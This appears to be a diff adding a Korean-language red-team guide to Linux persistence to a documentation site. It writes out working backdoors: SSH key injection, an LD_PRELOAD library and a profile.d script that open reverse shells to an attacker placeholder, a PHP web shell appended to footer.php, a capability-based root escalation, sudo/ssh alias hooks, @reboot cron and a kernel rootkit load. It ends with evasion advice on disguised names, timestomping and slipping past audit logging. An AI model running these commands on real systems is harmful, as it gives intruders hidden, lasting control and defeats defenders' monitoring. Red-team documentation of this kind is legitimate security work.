@@ -331,6 +331,178 @@ chmod 755 /tmp/.auth.sh
 # cp /tmp/pam_unix.so.bak /lib/x86_64-linux-gnu/security/pam_unix.so
 ```
 
+### Authorized Keys (Forced Command 우회 / 옵션 추가)
+
+```bash
+# 옵션을 우회하면서 추가
+echo 'no-port-forwarding,no-X11-forwarding command="/bin/bash -i" <attacker_pubkey>' \
+  >> ~/.ssh/authorized_keys
+# 키만 보고 ACL 검증하는 모니터링은 command 옵션 변경을 놓치는 경우 多
+
+# 루트 키 추가 (root 쓰기 권한 있을 때)
+mkdir -p /root/.ssh && chmod 700 /root/.ssh
+echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
+```
+
+### systemd Timer (cron 보다 조용함)
+
+```ini
+# /etc/systemd/system/sysupd.service
+[Unit]
+Description=System Update Helper
+[Service]
+Type=oneshot
+ExecStart=/usr/local/sbin/sysupd
+```
+
+```ini
+# /etc/systemd/system/sysupd.timer
+[Unit]
+Description=Run sysupd hourly
+[Timer]
+OnBootSec=5min
+OnUnitActiveSec=1h
+Unit=sysupd.service
+[Install]
+WantedBy=timers.target
+```
+
+```bash
+systemctl daemon-reload
+systemctl enable --now sysupd.timer
+systemctl list-timers --all | grep sysupd
+```
+
+cron 과 달리 **사용자 단위 타이머** (`~/.config/systemd/user/`) 는 더 발견하기 어렵다.
+
+```bash
+loginctl enable-linger <user>      # 사용자 로그아웃 후에도 동작
+systemctl --user enable --now beacon.timer
+```
+
+### LD_PRELOAD 백도어
+
+```bash
+# 모든 동적 링크 바이너리가 라이브러리를 먼저 로드 → 후킹
+cat > /tmp/hook.c <<'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+__attribute__((constructor)) void init(){
+  if(getuid()==0) system("nc <attacker> 4444 -e /bin/bash &");
+}
+EOF
+gcc -fPIC -shared /tmp/hook.c -o /lib/x86_64-linux-gnu/libsysinit.so
+
+# 영구 로드
+echo "/lib/x86_64-linux-gnu/libsysinit.so" > /etc/ld.so.preload
+```
+
+!!! danger "LD_PRELOAD"
+    `/etc/ld.so.preload` 가 잘못되면 **모든 명령이 실패** → 시스템 복구 불가 위험. 반드시 콘솔/구조 모드 접근 확보 후 진행.
+
+### Web Shell / Webhook (HTTP 백도어)
+
+```bash
+# 정상 사이트의 한 페이지에 작은 webhook 추가
+echo '<?php if($_GET["k"]=="X"){system($_GET["c"]);} ?>' >> /var/www/html/footer.php
+chown www-data:www-data /var/www/html/footer.php
+
+# 또는 /usr/lib/cgi-bin/ 에 .cgi 추가
+```
+
+### MOTD / Update Hook
+
+```bash
+# /etc/update-motd.d/ 의 스크립트는 SSH 로그인 시 root 로 실행됨
+cat > /etc/update-motd.d/00-helper << 'EOF'
+#!/bin/sh
+( /tmp/.beacon & ) >/dev/null 2>&1
+EOF
+chmod +x /etc/update-motd.d/00-helper
+
+# /etc/profile.d/ 도 유사 (모든 사용자 로그인 시)
+echo 'bash -i >& /dev/tcp/<a>/<p> 0>&1 &' > /etc/profile.d/x.sh
+chmod +x /etc/profile.d/x.sh
+```
+
+### eBPF / 커널 후킹 (고급)
+
+최신 환경 (kernel 5.x+) 에서 root 권한이 있으면 eBPF 프로그램 / kprobe 로 syscall 후킹.
+파일시스템에 흔적이 거의 없어 탐지 난이도 높음.
+
+```bash
+# 예: bcc / bpftrace 로 실행 인자 후킹 (학습 목적)
+bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("%s\n", str(args->filename)); }'
+
+# 실전 도구
+# - boopkit, ebpfkit (rootkit PoC, 학습/리서치 용도만)
+```
+
+탐지 측: Falco, Tracee, Tetragon 등 동일 eBPF 기반.
+
+### Linux Capabilities 백도어
+
+```bash
+# 특정 바이너리에 cap_setuid 등을 부여 → 일반 사용자가 root 권한 명령 실행
+setcap cap_setuid+ep /usr/bin/python3
+# 이후
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# 발견
+getcap -r / 2>/dev/null
+```
+
+### Wrapper / Shell Function 후킹 (사용자 환경)
+
+```bash
+# alias 또는 function 으로 정상 명령 후킹
+echo 'alias sudo="/tmp/.x; sudo"' >> ~/.bashrc
+echo 'function ssh(){ /tmp/.log_ssh "$@"; command ssh "$@"; }' >> ~/.bashrc
+```
+
+### Cron @reboot / anacron
+
+```bash
+(crontab -l 2>/dev/null; echo '@reboot /tmp/.b &') | crontab -
+echo '@reboot root /tmp/.b &' >> /etc/crontab
+
+# anacron (장기 슬립 호스트)
+echo '1 5 jobname /tmp/.b' >> /etc/anacrontab
+```
+
+### Rootkit (LKM)
+
+호스트와 동일 커널 헤더로 빌드 필요. 탐지 회피력 가장 높지만 운영 안정성 위험.
+
+```bash
+# 학습용 PoC (KoviD, Diamorphine 등)
+make
+insmod diamorphine.ko
+# 모듈/프로세스/포트/파일 숨김 + magic signal 로 root 셸
+```
+
+---
+
+## OPSEC / 탐지 회피 노트
+
+| 위치 | 탐지 난이도 | 비고 |
+|------|------------|------|
+| `~/.ssh/authorized_keys` | 낮음 (대부분 모니터됨) | 옵션 변형으로 일부 우회 가능 |
+| `crontab -l` | 낮음 | `/var/spool/cron/` 모니터됨 |
+| systemd service | 중 | timer + 일반 명명 권장 |
+| systemd user timer + linger | 높음 | 잘 모니터되지 않음 |
+| LD_PRELOAD | 중-높음 | `/etc/ld.so.preload` 는 EDR 가 자주 봄 |
+| Web Shell | 환경 따라 다름 | 웹로그/IDS 매칭 우선 |
+| eBPF | 매우 높음 | 단, EDR 도 eBPF → 충돌 시 탐지 |
+| LKM Rootkit | 매우 높음 | 안정성 위험, 인게이지먼트 룰 사전 합의 필요 |
+
+공통 권고:
+
+- 정상 패키지/관리자 도구처럼 보이는 **이름 / 경로** 사용 (`/usr/local/sbin/sysupd`, `update-helper` 등)
+- 파일 mtime/atime 을 주변 파일과 맞추기 (`touch -r /etc/hostname x`)
+- `auditd` / `journald` 룰 회피를 위해 `setfattr` 으로 audit 무시 속성 설정 (root 필요)
+- 작업 종료 후 추가한 모든 항목 **기록 + 정리**
+
 ---
 
 !!! info "관련 페이지"
